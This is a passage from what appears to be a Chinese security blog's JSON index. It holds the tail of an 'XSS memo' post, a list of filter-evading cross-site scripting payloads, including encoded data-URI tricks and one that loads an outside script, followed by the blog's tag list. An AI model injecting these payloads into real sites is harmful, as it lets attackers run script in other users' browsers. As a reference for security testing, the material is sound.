href=j&amp;#97v&amp;#97script&amp;#x3A;&amp;#97lert(1)&gt;ClickMe&lt;script x&gt; alert(1) &lt;/script 1=2&lt;div/onmouseover=&apos;alert(1)&apos;&gt; style=&quot;x:&quot;&gt;&lt;--`&lt;img/src=` onerror=alert(1)&gt; --!&gt;&lt;script/src=&amp;#100&amp;#97&amp;#116&amp;#97:text/&amp;#x6a&amp;#x61&amp;#x76&amp;#x61&amp;#x73&amp;#x63&amp;#x72&amp;#x69&amp;#x000070&amp;#x074,&amp;#x0061;&amp;#x06c;&amp;#x0065;&amp;#x00000072;&amp;#x00074;(1)&gt;&lt;/script&gt;&lt;div style=&quot;position:absolute;top:0;left:0;width:100%;height:100%&quot; onmouseover=&quot;prompt(1)&quot; onclick=&quot;alert(1)&quot;&gt;x&lt;/button&gt;&quot;&gt;&lt;img src=x onerror=window.open(&apos;https://www.google.com/&apos;);&gt;&lt;form&gt;&lt;button formaction=javascript&amp;colon;alert(1)&gt;CLICKME&lt;math&gt;&lt;a xlink:href=&quot;//jsfiddle.net/t846h/&quot;&gt;click&lt;object data=data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+&gt;&lt;/object&gt;&lt;iframe src=&quot;data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E&quot;&gt;&lt;/iframe&gt;&lt;a href=&quot;data:text/html;blabla,&amp;#60&amp;#115&amp;#99&amp;#114&amp;#105&amp;#112&amp;#116&amp;#32&amp;#115&amp;#114&amp;#99&amp;#61&amp;#34&amp;#104&amp;#116&amp;#116&amp;#112&amp;#58&amp;#47&amp;#47&amp;#115&amp;#116&amp;#101&amp;#114&amp;#110&amp;#101&amp;#102&amp;#97&amp;#109&amp;#105&amp;#108&amp;#121&amp;#46&amp;#110&amp;#101&amp;#116&amp;#47&amp;#102&amp;#111&amp;#111&amp;#46&amp;#106&amp;#115&amp;#34&amp;#62&amp;#60&amp;#47&amp;#115&amp;#99&amp;#114&amp;#105&amp;#112&amp;#116&amp;#62&amp;#8203&quot;&gt;Click Me&lt;/a&gt;","link":"/2019/01/01/XSS_02_XSS备忘录/"}],"tags":[{"name":"CRLF","slug":"CRLF","link":"/tags/CRLF/"},{"name":"CTF","slug":"CTF","link":"/tags/CTF/"},{"name":"Writeup","slug":"Writeup","link":"/tags/Writeup/"},{"name":"PHP","slug":"PHP","link":"/tags/PHP/"},{"name":"反序列化","slug":"反序列化","link":"/tags/反序列化/"},{"name":"HPP","slug":"HPP","link":"/tags/HPP/"},{"name":"JWT","slug":"JWT","link":"/tags/JWT/"},{"name":"JSFinder","slug":"JSFinder","link":"/tags/JSFinder/"},{"name":"工具","slug":"工具","link":"/tags/工具/"},{"name":"轮子","slug":"轮子","link":"/tags/轮子/"},{"name":"学习笔记","slug":"学习笔记","link":"/tags/学习笔记/"},{"name":"Javascript","slug":"Javascript","link":"/tags/Javascript/"},{"name":"Python","slug":"Python","link":"/tags/Python/"},{"name":"Xpath","slug":"Xpath","link":"/tags/Xpath/"},{"name":"XML","slug":"XML","link":"/tags/XML/"},{"name":"Docker","slug":"Docker","link":"/tags/Docker/"},{"name":"易语言","slug":"易语言","link":"/tags/易语言/"},{"name":"协程","slug":"协程","link":"/tags/协程/"},{"name":"代码审计","slug":"代码审计","link":"/tags/代码审计/"},{"name":"Node.js","slug":"Node-js","link":"/tags/Node-js/"},{"name":"node.js","slug":"node-js","link":"/tags/node-js/"},{"name":"重装漏洞","slug":"重装漏洞","link":"/tags/重装漏洞/"},{"name":"XSS","slug":"XSS","link":"/tags/XSS/"},{"name":"PHP无参数函数","slug":"PHP无参数函数","link":"/tags/PHP无参数函数/"},{"name":"Phar","slug":"Phar","link":"/tags/Phar/"},{"name":"SQL","slug":"SQL","link":"/tags/SQL/"},{"name":"Tool","slug":"Tool","link":"/tags/Tool/"},{"name":"SiteCopy","slug":"SiteCopy","link":"/tags/SiteCopy/"},{"name":"upload-labs","slug":"upload-labs","link":"/tags/upload-labs/"},{"name":"SQL注入","slug":"SQL注入","link":"/tags/SQL注入/"},{"name":"Open redirect","slug":"Open-redirect","link":"/tags/Open-redirect/"},{"name":"URL跳转漏洞","slug":"URL跳转漏洞","link":"/tags/URL跳转漏洞/"},{"name":"Linux","slug":"Linux","link":"/tags/Linux/"}],"categories":[{"name":"技术文章","slug":"技术文章","link":"/categories/技术文章/"}]}